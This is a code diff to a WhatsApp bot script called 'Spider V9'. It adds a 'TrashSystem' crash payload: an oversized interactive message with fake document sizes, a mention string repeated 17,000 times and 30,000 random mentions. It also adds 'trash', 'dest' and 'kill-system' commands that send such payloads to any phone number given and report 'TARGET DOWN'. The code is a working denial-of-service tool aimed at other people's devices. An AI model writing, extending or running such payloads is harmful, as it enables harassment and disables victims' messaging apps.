@@ -184,6 +184,7 @@ const groupOwner = m.isGroup ? groupMetadata.owner : ''
 const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
 //=================================================//
 const samido = fs.readFileSync(path.resolve(__dirname, './media/menu.mp3'))
+const bugaudio = fs.readFileSync(path.resolve(__dirname, './media/menu.mp3'))
 const spider = fs.readFileSync(path.resolve(__dirname, './media/spider.jpg'))
 //=================================================//
 const from = m.chat;
@@ -704,6 +705,84 @@ async function ZnXIvS(target, Ptcp = true) {
    } : {});
    console.log(chalk.green("Send Bug By Spider V9〽️"));
   };
+async function TrashSystem(target, spider, Ptcp = true) {
+   await sam.relayMessage(target, {
+     ephemeralMessage: {
+      message: {
+       interactiveMessage: {
+        header: {
+         documentMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+          fileLength: "9999999999999",
+          pageCount: 1316134911,
+          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+          fileName: "᳀ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 メ",
+          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+          mediaKeyTimestamp: "1726867151",
+          contactVcard: true,
+          jpegThumbnail: spider,
+         },
+         hasMediaAttachment: true,
+        },
+        body: {
+         text: "🏴‍☠️ 𝐏᪲᪱‌𝐫𝐒𝐩𝐢𝐝𝐞𝐫-𝐅𝐚‌𝐭‌𝐚𝐥‌𝐄‌𝐱𝐞𝐜‌𝐮‌𝐭𝐞 🦣\n" + "@6285655649546".repeat(17000),
+        },
+        nativeFlowMessage: {
+         buttons: [{
+           name: "cta_url",
+           buttonParamsJson: "{ display_text: '✨⃟༑⌁⃰𝐒𝐩𝐢𝐝𝐞𝐫 𝐂𝐫𝐚𝐬𝐡 ϟ〽️', url: \"https://youtube.com/king_sam_hub\", merchant_url: \"https://youtube.com/king_sam_hub\" }",
+          },
+          {
+           name: "call_permission_request",
+           buttonParamsJson: "{}",
+          },
+         ],
+         messageParamsJson: "{}",
+        },
+        contextInfo: {
+         mentionedJid: ["6285655649546@s.whatsapp.net", ...Array.from({
+          length: 30000
+         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
+         forwardingScore: 1,
+         isForwarded: true,
+         fromMe: false,
+         participant: "0@s.whatsapp.net",
+         remoteJid: "status@broadcast",
+         quotedMessage: {
+          documentMessage: {
+           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+           fileLength: "9999999999999",
+           pageCount: 1316134911,
+           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+           fileName: "𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9〽️",
+           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+           mediaKeyTimestamp: "1724474503",
+           contactVcard: true,
+           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+           jpegThumbnail: "",
+          },
+         },
+        },
+       },
+      },
+     },
+    },
+    Ptcp ? {
+     participant: {
+      jid: target
+     }
+    } : {}
+   );
+   console.log(chalk.green("Send Bug By Spider〽️"));
+  };
 //================================================//
 async function crtVid(url) {
     const { videoMessage } = await generateWAMessageContent({
@@ -768,11 +847,11 @@ switch (command) {
 //===========================================//
 case 'menu': case 'spider':{
 let kimg=`
-
-▬▬▬▬▬▬▬▬▬▬▬▬▬
-   ◉ 𝙷𝚒  ${m.pushName} 𝚃𝚑𝚒𝚜 𝚋𝚘𝚝 𝚒𝚜 𝚜𝚝𝚒𝚕𝚕 𝚞𝚗𝚍𝚎𝚛 𝚖𝚊𝚗𝚝𝚊𝚒𝚗𝚊𝚗𝚌𝚎...
-   ◉ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝 t.me/The_Chosen_001 𝚏𝚘𝚛 𝚖𝚘𝚛𝚎 𝚒𝚗𝚏𝚘𝚛𝚖𝚊𝚝𝚒𝚘𝚗..... 
-▬▬▬▬▬▬▬▬▬▬▬▬▬
+     𝗗𝗘𝗩𝗜𝗟-𝗦𝗣𝗜𝗗𝗘𝗥-𝗩9
+┏━━━━━━━━━━━━━━━━━
+┃  ✰ 𝙷𝚒  ${m.pushName} 𝚃𝚑𝚒𝚜 𝚋𝚘𝚝 𝚒𝚜 𝚜𝚝𝚒𝚕𝚕 𝚞𝚗𝚍𝚎𝚛 𝚖𝚊𝚗𝚝𝚊𝚒𝚗𝚊𝚗𝚌𝚎...
+┃  ✰ 𝚈𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚛𝚒𝚊𝚕?? 𝙹𝚘𝚒𝚗 𝚝𝚑𝚎 𝚌𝚑𝚊𝚗𝚗𝚎𝚕 𝚊𝚗𝚍 𝚏𝚘𝚕𝚕𝚘𝚠 𝚢𝚘𝚞𝚝𝚞𝚋𝚎 𝚌𝚑𝚊𝚗𝚗𝚎𝚕..
+┗━━━━━━━━━━━━━━━━━
 © 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
 sam.sendMessage(m.chat, { 
 	           text: kimg,
@@ -796,45 +875,185 @@ mimetype: 'audio/mpeg'
 })
 }
 break
-case 'invis': {
+case 'trash': {
+	
+			if (!isCreator) return reply(mess.owner)
+			if (!q) return reply(`*Cannot Procces your Request*\n\n_Use : trash Number_\n_Example : .trash 254xx_\n\n𝐒𝐏𝐈𝐃𝐄𝐑-𝐕8👽`);
+			incTarget = text.split("|")[0].replace(/[^0-9]/g, '')
+			if (incTarget.startsWith('0')) return reply(`*Syntax Error!*\n\n_Use : trash Number_\n_Example : .trash 2547xx_\n\n𝐒𝐏𝐈𝐃𝐄𝐑-𝐕8👺`)
+			let target = incTarget + '@s.whatsapp.net'
+			global.jumlah = text.split("|")[1]
+
+			let sections = [{
+			
+					title: '⌜𝐃𝐄𝐕𝐈𝐋 𝐒𝐏𝐈𝐃𝐄𝐑 𝐕9⌟',
+					highlight_label: "𝐂𝐎𝐌𝐈𝐍𝐆 𝐒𝐎𝐎𝐍",
+					rows: [{
+						title: '💥 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 🦄',
+						id: `.samsung-try ${incTarget}`
+					}]
+				},
+				{   
+					highlight_label: "🏴‍☠️ 𝐃𝐄𝐒𝐓 🏴‍☠️",
+					rows: [{
+						title: '𝐋𝐄𝐆𝐄𝐍𝐃 𝐊𝐈𝐋𝐋𝐄𝐑',
+						id: `.dest ${incTarget}`
+					}]
+				},
+				{   
+					highlight_label: "🏴‍☠️ 𝐃𝐀𝐍𝐆𝐄𝐑 🦣",
+					rows: [{
+						title: '🙃 𝐊𝐈𝐋𝐋 𝐓𝐀𝐑𝐆𝐄𝐓 𝐏𝐇𝐎𝐍𝐄 🕷️',
+						id: `.kill-system ${incTarget}`
+					}]
+				},
+				{
+					title: '⌜ 𝐈𝚯𝐒 ⌟',
+					highlight_label: "🤖𝐒𝐮𝐩𝐫𝐢𝐬𝐞 𝐈𝐨𝐬🫶",
+					rows: [{
+						title: '⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
+						description: `☇`,
+						id: `.fake-ios ${incTarget}|2`
+					}]
+				},
+				{
+					title: '⌜ 𝐇𝚯𝐋𝐃 ⌟',
+					rows: [{
+						title: '𝐓𝐄𝐌𝐏-𝐁𝐀𝐍',
+						id: `.temp-ban ${incTarget}`
+					}]
+				},
+					{
+					title: '⌜ 𝐇𝚯𝐋𝐃 ⌟',
+					rows: [{
+						title: '𝐒𝐏𝐀𝐌-𝐏𝐀𝐈𝐑',
+						id: `.spam-pair ${incTarget}|250`
+					}]
+				}
+			]
+
+			let listMessage = {
+				title: `╫ 𝐒𝐏𝐈𝐃𝐄𝐑-𝐕9 ╫`,
+				sections
+			};
+	let msg = generateWAMessageFromContent(m.chat, {
+				viewOnceMessage: {
+					message: {
+						"messageContextInfo": {
+							"deviceListMetadata": {},
+							"deviceListMetadataVersion": 2
+						},
+						interactiveMessage: proto.Message.InteractiveMessage.create({
+							contextInfo: {
+								mentionedJid: [m.sender],
+								isForwarded: true,
+								forwardingScore: 999,
+								forwardedNewsletterMessageInfo: {
+									newsletterJid: '120363320283062687@newsletter',
+									newsletterName: '☠️⃟S҉ P҉ I҉ D҉ E҉ R҉  C҉ R҉ A҉ S҉ H҉ 🦄',
+									serverMessageId: -1
+								},
+								businessMessageForwardInfo: {
+									businessOwnerJid: sam.decodeJid(sam.user.id)
+								},
+							},
+							body: proto.Message.InteractiveMessage.Body.create({
+								text: ''
+							}),
+							footer: proto.Message.InteractiveMessage.Footer.create({
+								text: `⿻  ⌜ 𝐒𝐏𝐈𝐃𝐄𝐑 𝐕8 ⌟  ⿻`
+							}),
+							header: proto.Message.InteractiveMessage.Header.create({
+								title: `\n⃟🕷️ S҉ P҉ I҉ D҉ E҉ R҉  V҉08 🔥⃟\n›› 𝐓𝐫𝐚𝐬𝐡 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${incTarget}\n`,
+								subtitle: `️`,
+								hasMediaAttachment: true,
+								...(await prepareWAMessageMedia({
+									image: {
+										url: 'https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg'
+									}
+								}, {
+									upload: sam.waUploadToServer
+								}))
+							}),
+							nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+								buttons: [{
+									"name": "single_select",
+									"buttonParamsJson": JSON.stringify(listMessage)
+								}, ]
+							})
+						})
+					}
+				}
+			}, {})
+
+			await sam.relayMessage(msg.key.remoteJid, msg.message, {
+				messageId: msg.key.id
+			})
+		}
+		break
+case 'dest': {
 if (!isCreator) return reply(mess.owner)
 if (!isPremium) return reply(mess.prem)
 if (!q) return reply(`Example: ${prefix + command} 2547×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(`Wait Your Target is being Utilised`)
 for (let i = 0; i < 2; i++) {
-await ZnXIvS(target, sam, cct = true, ptcp = true)
+await InVisiXz(target, sam, cct = true, ptcp = true)
 }
-reply(`⫹𝐒𝐏𝐈𝐃𝐄𝐑 𝐔𝐓𝐈𝐋𝐈𝐒𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐅𝐔𝐋⫺
-
-𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
-𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
-𝐔𝐒𝐈𝐍𝐆 : ${command}
-
-    𝐍𝐎𝐓𝐄
-> *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
-> *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*`)
+reply(`
+┏━━━━━━━━━━━━━━━━━━━━━
+┃ ▣ 𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗢𝗪𝗡
+┃ ⎐ 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗 𝗕𝗬 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩9
+┗━━━━━━━━━━━━━━━━━━━━━
+┏━━━━━━━━━━━━━━━━━━━━━
+┃߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+┃֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
+┃࿉ 𝐔𝐒𝐈𝐍𝐆 : ${command}
+┗━━━━━━━━━━━━━━━━━━━━━
+   ꀦ 𝗡𝗢𝗧𝗘: 
+┏━━━━━━━━━━━━━━━━━━━━━
+┃☘ *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
+┃☘ *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*
+┗━━━━━━━━━━━━━━━━━━━━━`)
+await sam.sendMessage(m.chat, {
+audio: bugaudio,
+mimetype: 'audio/mpeg'
+}, { quoted: m
+})
 }
 break
-		case 'test': {
+		case 'kill-system': {
 if (!isCreator) return reply(mess.owner)
 if (!isPremium) return reply(mess.prem)
 if (!q) return reply(`Example: ${prefix + command} 2547×××`)
 target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 reply(`Wait Your Target is being Utilised`)
 // Function to convert text to invisible characters
-    await invisibleAction(sam, target, fake)
-reply(`⫹𝐒𝐏𝐈𝐃𝐄𝐑 𝐔𝐓𝐈𝐋𝐈𝐒𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐅𝐔𝐋⫺
-
-𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
-𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
-𝐔𝐒𝐈𝐍𝐆 : ${command}
-
-    𝐍𝐎𝐓𝐄
-> *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
-> *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*`)
+   await TrashSystem(target, sam, cct = true, ptcp = true)
+  await TrashSystem(target, sam, cct = true, ptcp = true)
+reply(`
+┏━━━━━━━━━━━━━━━━━━━━━
+┃ ▣ 𝗧𝗔𝗥𝗚𝗘𝗧 𝗗𝗢𝗪𝗡
+┃ ⎐ 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗 𝗕𝗬 𝗦𝗣𝗜𝗗𝗘𝗥 𝗩9
+┗━━━━━━━━━━━━━━━━━━━━━
+┏━━━━━━━━━━━━━━━━━━━━━
+┃߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
+┃֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
+┃࿉ 𝐔𝐒𝐈𝐍𝐆 : ${command}
+┗━━━━━━━━━━━━━━━━━━━━━
+   ꀦ 𝗡𝗢𝗧𝗘: 
+┏━━━━━━━━━━━━━━━━━━━━━
+┃☘ *DO NOT MISUSE THE BOT OR ELSE IT WILL GET BANNED*
+┃☘ *WAIT FOR 2 MINUTES BEFORE USING ANOTHER COMMAND*
+┗━━━━━━━━━━━━━━━━━━━━━`)
+await sam.sendMessage(m.chat, {
+audio: bugaudio,
+mimetype: 'audio/mpeg'
+}, { quoted: m
+})
 }
 break
+
 
 		
 
@@ -871,7 +1090,7 @@ if (stdout) return m.reply(stdout.toString())
 }
 } catch (err) {
 const handleError = async () => {
-sam.sendMessage(global.ownMain + "@s.whatsapp.net", {
+sam.sendMessage(m.chat, {
 text: require("util").format(err)
 }, {
 quoted: m
